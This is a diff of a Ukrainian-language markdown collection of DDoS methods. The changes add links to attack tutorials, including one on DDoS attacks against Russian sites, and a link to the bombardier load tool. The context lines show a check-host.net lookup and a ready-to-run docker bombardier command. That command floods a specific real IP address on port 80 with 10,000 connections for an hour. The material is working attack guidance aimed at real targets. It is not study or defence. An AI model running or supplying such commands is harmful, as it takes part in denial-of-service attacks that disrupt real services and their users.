@@ -1,10 +1,10 @@
 # Збірка DDoS методів
 
-# Туторіали про DDoS
-- https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit
-- https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2
-- https://zhashkevych.notion.site/zhashkevych/DDOS-1758d62440c34f6186c2cefdeee204a0
-
+# Туторіали? гайди, інструкції, etc. про DDoS
+- [Інструкція щодо ДДоС-атаки для чайників](https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit) by unknown
+- [Туторіал по DDoS](https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2) by tarahtino
+- [Инструкция по DDOS атакам](https://zhashkevych.notion.site/zhashkevych/DDOS-1758d62440c34f6186c2cefdeee204a0) by zhashkevych
+- [Подробная инструкция как помочь с DDOS атаками на русские сайты](https://arickvigas.medium.com/%D0%BF%D0%BE%D0%B4%D1%80%D0%BE%D0%B1%D0%BD%D0%B0%D1%8F-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BA%D1%86%D0%B8%D1%8F-%D0%BA%D0%B0%D0%BA-%D0%BF%D0%BE%D0%BC%D0%BE%D1%87%D1%8C-%D1%81-ddos-%D0%B0%D1%82%D0%B0%D0%BA%D0%B0%D0%BC%D0%B8-%D0%BD%D0%B0-%D1%80%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B5-%D1%81%D0%B0%D0%B9%D1%82%D1%8B-76947f54194f)
 
 ## Як провірити чи сайт "впав" остаточно
 
@@ -63,7 +63,8 @@ https://check-host.net/check-udp?host=194.54.14.187
 
 **Docker** метод 1 (треба VPN)
 
-https://hub.docker.com/r/alpine/bombardier
+- https://github.com/codesenberg/bombardier
+- https://hub.docker.com/r/alpine/bombardier
 
 ```
 docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:80
